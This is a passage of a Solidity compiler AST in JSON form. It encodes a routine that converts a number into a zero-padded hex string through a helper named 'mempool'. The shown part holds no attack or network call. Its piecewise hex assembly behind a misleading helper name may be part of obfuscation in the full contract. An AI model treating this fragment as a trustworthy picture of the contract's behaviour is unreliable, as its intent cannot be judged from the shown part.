																			"typeIdentifier": "t_function_internal_pure$_t_uint8_$returns$_t_bytes1_$",
																			"typeString": "function (uint8) pure returns (bytes1)"
																		}
																	},
																	"id": 976,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "10483:20:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "10462:41:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 978,
															"nodeType": "ExpressionStatement",
															"src": "10462:41:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 981,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 979,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 916,
																	"src": "10518:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 980,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10523:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10518:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 982,
															"nodeType": "ExpressionStatement",
															"src": "10518:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 954,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 952,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 949,
														"src": "10408:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 953,
														"name": "count",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 922,
														"src": "10410:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10408:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 984,
												"initializationExpression": {
													"assignments": [
														949
													],
													"declarations": [
														{
															"constant": false,
															"id": 949,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 984,
															"src": "10398:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 948,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "10398:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 951,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 950,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10405:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "10398:8:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 956,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": true,
														"src": "10417:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 955,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 949,
															"src": "10419:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 957,
													"nodeType": "ExpressionStatement",
													"src": "10417:3:0"
												},
												"nodeType": "ForStatement",
												"src": "10393:144:0"
											},
											{
												"assignments": [
													986
												],
												"declarations": [
													{
														"constant": false,
														"id": 986,
														"mutability": "mutable",
														"name": "hexLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1069,
														"src": "10547:14:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 985,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10547:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 995,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 991,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 942,
																		"src": "10577:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"id": 990,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "10570:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																		"typeString": "type(string storage pointer)"
																	},
																	"typeName": {
																		"id": 989,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "10570:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 992,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "10570:11:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															],
															"id": 988,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "10564:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																"typeString": "type(bytes storage pointer)"
															},
															"typeName": {
																"id": 987,
																"name": "bytes",
																"nodeType": "ElementaryTypeName",
																"src": "10564:5:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 993,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "10564:18:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													},
													"id": 994,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "length",
													"nodeType": "MemberAccess",
													"referencedDeclaration": null,
													"src": "10564:25:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10547:42:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 998,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 996,
														"name": "hexLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 986,
														"src": "10604:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "34",
														"id": 997,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10617:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_4_by_1",
															"typeString": "int_const 4"
														},
														"value": "4"
													},
													"src": "10604:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1014,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1012,
															"name": "hexLength",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 986,
															"src": "10733:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "33",
															"id": 1013,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "10746:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_3_by_1",
																"typeString": "int_const 3"
															},
															"value": "3"
														},
														"src": "10733:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1030,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1028,
																"name": "hexLength",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 986,
																"src": "10862:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 1029,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "10875:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"src": "10862:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1046,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1044,
																	"name": "hexLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 986,
																	"src": "10993:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 1045,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11006:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "10993:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 1060,
															"nodeType": "IfStatement",
															"src": "10989:126:0",
															"trueBody": {
																"id": 1059,
																"nodeType": "Block",
																"src": "11009:106:0",
																"statements": [
																	{
																		"assignments": [
																			1048
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1048,
																				"mutability": "mutable",
																				"name": "_hexC4",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1059,
																				"src": "11024:20:0",
																				"stateVariable": false,
																				"storageLocation": "memory",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string"
																				},
																				"typeName": {
																					"id": 1047,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "11024:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_storage_ptr",
																						"typeString": "string"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1056,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "30303030",
																					"id": 1050,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "string",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "11055:6:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					"value": "0000"
																				},
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1053,
																							"name": "res",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 942,
																							"src": "11070:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						],
																						"id": 1052,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "11063:6:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																							"typeString": "type(string storage pointer)"
																						},
																						"typeName": {
																							"id": 1051,
																							"name": "string",
																							"nodeType": "ElementaryTypeName",
																							"src": "11063:6:0",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1054,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "11063:11:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					{
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				],
																				"id": 1049,
																				"name": "mempool",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1679,
																				"src": "11047:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																					"typeString": "function (string memory,string memory) pure returns (string memory)"
																				}
																			},
																			"id": 1055,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "11047:28:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11024:51:0"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1057,
																			"name": "_hexC4",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1048,
																			"src": "11097:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"functionReturnParameters": 920,
																		"id": 1058,
																		"nodeType": "Return",
																		"src": "11090:13:0"
																	}
																]
															}
														},
														"id": 1061,
														"nodeType": "IfStatement",
														"src": "10858:257:0",
														"trueBody": {
															"id": 1043,
															"nodeType": "Block",
															"src": "10878:105:0",
															"statements": [
																{
																	"assignments": [
																		1032
																	],
																	"declarations": [
																		{
																			"constant": false,
																			"id": 1032,
																			"mutability": "mutable",
																			"name": "_hexC3",
																			"nodeType": "VariableDeclaration",
																			"overrides": null,
																			"scope": 1043,
																			"src": "10893:20:0",
																			"stateVariable": false,
																			"storageLocation": "memory",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string"
																			},
																			"typeName": {
																				"id": 1031,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "10893:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_storage_ptr",
																					"typeString": "string"
																				}
																			},
																			"value": null,
																			"visibility": "internal"
																		}
																	],
																	"id": 1040,
																	"initialValue": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "303030",
																				"id": 1034,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "10924:5:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				"value": "000"
																			},
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1037,
																						"name": "res",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 942,
																						"src": "10938:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					],
																					"id": 1036,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "10931:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																						"typeString": "type(string storage pointer)"
																					},
																					"typeName": {
																						"id": 1035,
																						"name": "string",
																						"nodeType": "ElementaryTypeName",
																						"src": "10931:6:0",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 1038,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "10931:11:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				{
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			],
																			"id": 1033,
																			"name": "mempool",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1679,
																			"src": "10916:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																				"typeString": "function (string memory,string memory) pure returns (string memory)"
																			}
																		},
																		"id": 1039,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "10916:27:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"nodeType": "VariableDeclarationStatement",
																	"src": "10893:50:0"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 1041,
																		"name": "_hexC3",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1032,
																		"src": "10965:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"functionReturnParameters": 920,
																	"id": 1042,
																	"nodeType": "Return",
																	"src": "10958:13:0"
																}
															]
														}
													},
													"id": 1062,
													"nodeType": "IfStatement",
													"src": "10729:386:0",
													"trueBody": {
														"id": 1027,
														"nodeType": "Block",
														"src": "10749:103:0",
														"statements": [
															{
																"assignments": [
																	1016
																],
																"declarations": [
																	{
																		"constant": false,
																		"id": 1016,
																		"mutability": "mutable",
																		"name": "_hexC2",
																		"nodeType": "VariableDeclaration",
																		"overrides": null,
																		"scope": 1027,
																		"src": "10764:20:0",
																		"stateVariable": false,
																		"storageLocation": "memory",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string"
																		},
																		"typeName": {
																			"id": 1015,
																			"name": "string",
																			"nodeType": "ElementaryTypeName",
																			"src": "10764:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_storage_ptr",
																				"typeString": "string"
																			}
																		},
																		"value": null,
																		"visibility": "internal"
																	}
																],
																"id": 1024,
																"initialValue": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 1018,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "string",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "10795:3:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			"value": "0"
																		},
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1021,
																					"name": "res",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 942,
																					"src": "10807:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				],
																				"id": 1020,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "10800:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																					"typeString": "type(string storage pointer)"
																				},
																				"typeName": {
																					"id": 1019,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "10800:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1022,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10800:11:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			{
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		],
																		"id": 1017,
																		"name": "mempool",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1679,
																		"src": "10787:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																			"typeString": "function (string memory,string memory) pure returns (string memory)"
																		}
																	},
																	"id": 1023,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "10787:25:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"nodeType": "VariableDeclarationStatement",
																"src": "10764:48:0"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 1025,
																	"name": "_hexC2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1016,
																	"src": "10834:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"functionReturnParameters": 920,
																"id": 1026,
																"nodeType": "Return",
																"src": "10827:13:0"
															}
														]
													}
												},
												"id": 1063,
												"nodeType": "IfStatement",
												"src": "10600:515:0",
												"trueBody": {
													"id": 1011,
													"nodeType": "Block",
													"src": "10620:103:0",
													"statements": [
														{
															"assignments": [
																1000
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 1000,
																	"mutability": "mutable",
																	"name": "_hexC1",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 1011,
																	"src": "10635:20:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 999,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "10635:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 1008,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 1002,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10666:3:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		"value": "0"
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1005,
																				"name": "res",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 942,
																				"src": "10678:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 1004,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "10671:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																				"typeString": "type(string storage pointer)"
																			},
																			"typeName": {
																				"id": 1003,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "10671:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 1006,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "10671:11:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 1001,
																	"name": "mempool",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1679,
																	"src": "10658:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory,string memory) pure returns (string memory)"
																	}
																},
																"id": 1007,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "10658:25:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
